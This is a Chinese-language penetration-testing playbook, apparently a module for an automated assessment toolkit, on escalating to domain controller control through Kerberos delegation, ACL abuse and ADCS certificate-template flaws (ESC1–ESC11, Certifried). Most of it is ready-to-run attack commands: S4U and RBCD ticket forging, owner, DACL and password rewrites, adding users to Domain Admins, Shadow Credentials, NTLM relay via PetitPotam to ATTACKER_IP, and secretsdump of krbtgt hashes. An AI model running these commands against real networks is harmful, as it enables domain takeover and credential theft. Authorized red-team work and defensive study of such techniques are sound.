# 委派、ACL 与 ADCS

> 适用：BloodHound 已指出委派/ACL 边、或域内存在 CA 与配置错误的证书模板时，把配置缺陷转成域控权限的授权评估。

## 认什么

| 面 | 关键属性/标志 | 判据 |
|---|---|---|
| 非约束委派 | `TRUSTED_FOR_DELEGATION`（UAC 524288） | 已控该主机才能用 |
| 约束委派 | `msDS-AllowedToDelegateTo` | 看是否另有 `TRUSTED_TO_AUTH_FOR_DELEGATION`（协议转换） |
| RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` | 对目标有 GenericWrite/GenericAll/WriteDacl |
| ACL | GenericAll 0x10000000 / GenericWrite 0x40000000 / WriteDacl 0x00040000 / WriteOwner 0x00080000 / Self 0x8 / AllExtendedRights 0x100 / ForceChangePassword | 权限落在用户/组/计算机/域对象上 |
| ADCS | CA 主机、`/certsrv/` 返回 401 或登录页 | `netexec ldap -M adcs`、`certipy find` |
| ESC1 | 模板 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` + 低权限可 Enroll + Client Authentication EKU | certipy 标注 ESC1 |
| ESC2/ESC3 | Any Purpose / SubCA；Certificate Request Agent | 看模板 EKU |
| ESC4 | 对模板有 WriteDacl/WriteOwner/WriteProperty | `certipy find` 报 Write |
| ESC6 | CA 启 `EDITF_ATTRIBUTESUBJECTALTNAME2` | `certutil -getreg policy\EditFlags` |
| ESC7 | ManageCA / ManageCertificates | CA 权限 |
| ESC8/ESC11 | Web Enrollment 或 ICPR(RPC) 可中继 | `/certsrv/` 可达且无 EPA |
| ESC9/10 | `CT_FLAG_NO_SECURITY_EXTENSION`；`CertificateMappingMethods` 含 UPN | 弱证书绑定 |
| Certifried | CVE-2022-26923，机器账户 `dNSHostName` 可控 | 可改机器属性 |

## 打哪（命令）

**枚举**

```bash
findDelegation.py DOMAIN/USER:PASS -dc-ip DC_IP
dacledit.py -dc-ip DC_IP DOMAIN/user:pass -target 'Domain Admins' -action read
netexec ldap DC_IP -u user -p pass --dacl "CN=Domain Admins"
bloodhound-python -d DOMAIN -u user -p pass -dc DC_IP -c all
certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -enabled -vulnerable -stdout
netexec ldap DC_IP -u USER -p PASS -M adcs
curl -sk https://CA_SERVER/certsrv/
```

LDAP 过滤器（直接抄用，别自造）：

```text
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))
(&(objectCategory=*)(msDS-AllowedToDelegateTo=*))
(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))
```

**委派利用**

```bash
# 非约束：已控主机上监听 + 强制认证
Rubeus.exe monitor /interval:10 /nowrap /filteruser:DC01$
coercer coerce -u USER -p PASS -d DOMAIN -l UNCONSTRAINED_MACHINE -t DC_IP
PetitPotam.py UNCONSTRAINED_MACHINE DC_IP
# 约束（有协议转换）：S4U2Self + S4U2Proxy，SPN 可 altservice 改写
getST.py -spn cifs/TARGET_FQDN -impersonate Administrator DOMAIN/SVC:PASS
getST.py -spn time/DC_FQDN -impersonate Administrator -altservice cifs/DC_FQDN DOMAIN/SVC:PASS
# RBCD：造机器账户 → 写属性 → S4U
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'P@ssw0rd123' -dc-ip DC_IP DOMAIN/USER:PASS
rbcd.py -delegate-from 'YOURPC$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP DOMAIN/USER:PASS
getST.py -spn cifs/TARGET_FQDN -impersonate Administrator DOMAIN/'YOURPC$':'P@ssw0rd123'
rbcd.py -delegate-to 'TARGET$' -action flush -dc-ip DC_IP DOMAIN/USER:PASS   # 收工清理
```

**ACL 滥用**

```bash
# WriteOwner → WriteDacl → GenericAll
owneredit.py -dc-ip DC_IP DOMAIN/user:pass -target "CN=Target,DC=domain,DC=com" -new-owner user
dacledit.py -dc-ip DC_IP DOMAIN/user:pass -target "CN=Target,DC=domain,DC=com" -action write -rights GenericAll -principal user
# 改密 / 入组
net rpc password target_user 'N3wP@ss!' -U 'DOMAIN/user%pass' -S DC_IP
rpcclient -U "user%pass" DC_IP -c "setuserinfo2 target_user 23 N3wP@ss!"
net rpc group addmem "Domain Admins" user -U user%pass -S DC_IP
bloodyAD -d DOMAIN -u USER -p PASS --host DC_IP add groupMember "Domain Admins" "TARGET_USER"
# Shadow Credentials
python3 pywhisker.py -d DOMAIN -u user -p pass --dc-ip DC_IP -t target_user -a add
python3 gettgtpkinit.py -cert-pfx output.pfx -pfx-pass PASS DOMAIN/target_user target_user.ccache
```

**ADCS 利用**

```bash
# ESC1
certipy req -u USER@DOMAIN -p PASS -dc-ip DC_IP -ca CA_NAME -template VULN_TEMPLATE -upn administrator@DOMAIN
certipy auth -pfx administrator.pfx -dc-ip DC_IP
impacket-secretsdump -hashes :HASH DOMAIN/administrator@DC_IP
# ESC4：先把模板改成 ESC1，打完恢复
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP -template TEMPLATE_NAME -save-old
certipy template -u USER@DOMAIN -p PASS -dc-ip DC_IP -template TEMPLATE_NAME -configuration TEMPLATE_NAME.json
# ESC6 / ESC7
certutil -config "CA_SERVER\CA-NAME" -getreg policy\EditFlags
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP -ca CA-NAME -enable-template SubCA
certipy ca -u USER@DOMAIN -p PASS -dc-ip DC_IP -ca CA-NAME -issue-request REQUEST_ID
# ESC8：强制认证 + 中继到 Web Enrollment
ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP
echo "BASE64" | base64 -d > dc.pfx && certipy auth -pfx dc.pfx -dc-ip DC_IP
# ESC11：RPC 端点中继
ntlmrelayx.py -t "rpc://CA_SERVER" -rpc-mode icpr -smb2support --adcs --template DomainController
# 无 PKINIT 时走 Schannel
certipy auth -pfx user.pfx -dc-ip DC_IP -ldap-shell
python3 /pentest/PassTheCert/Python/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain DOMAIN -dc-ip DC_IP
```

## 什么算成

- 委派：`getST` 落出可用 ccache，`secretsdump -k -no-pass` 导出 hash
- RBCD：`rbcd.py -action read` 能回读 `msDS-AllowedToActOnBehalfOfOtherIdentity`，随后 S4U 拿到目标服务票据
- ACL：写入可回读（用户确实进了 Domain Admins、Key Credential 出现在 `msDS-KeyCredentialLink`），且后续动作生效
- ESC1：证书 SAN 是目标 UPN，`certipy auth` 同时给出 ccache 与 NT hash → DCSync 出 krbtgt
- ESC8：ntlmrelayx 打印 `GOT CERTIFICATE` 并落 Base64，认证后得到 DC 机器账户 hash
- 已有 CA 私钥时：`certipy forge` 出的伪造证书能通过认证（Golden Certificate）

## 假点

- `findDelegation` 列出配置 ≠ 可利用：非约束委派要先控那台机器；约束委派无协议转换时 S4U2Self 票据不可转发，需 RBCD 或先捕获用户票据
- RBCD 写成功但 S4U 报 `KDC_ERR_BADOPTION`：被模拟用户在 Protected Users / marked sensitive、SPN 与 DNS 不一致、机器账户没 SPN
- RBCD 需要 MAQ>0 或已有机器账户；MAQ 耗尽改用已控机器账户（`crackmapexec ldap -M maq`）
- 模板能申请 ≠ 能冒充：无 Client Authentication EKU、或 CA 开了 manager approval 时只拿到 pending Request ID
- ESC1 拿到 pfx ≠ 域管：强证书绑定（`StrongCertificateBindingEnforcement=2`）会拒签认证；必要时转 ESC9/ESC10 弱绑定
- 有 CA ≠ ADCS 可用：模板不给 Domain Users Enroll、或未装 Web Enrollment，ESC8 就不成立
- 高风险 ACL 动作会被还原或直接告警：改 `AdminSDHolder` 被 SDProp 覆盖；重置密码让原用户登不上；改 DA 组成员是高优先级告警
- 有证书 ≠ 能 PKINIT：`KDC_ERR_PADATA_TYPE_NOSUPP` 时改 Schannel/PassTheCert，不是"没拿到权限"

## 与其他包联动

- 枚举结果来自 `internal-01`；UnPAC-the-hash 与票据用法 → `internal-02`；ESC8 的强制认证与中继 → `internal-04`；拿到 ST/hash 后落地 → `internal-05`
- 证书入口常由 `web-auth-access`（注册/找回密码/JWT）或 `internal-04` 的中继提供；报告口径见 `../../../../rules/40-evidence-report.md`
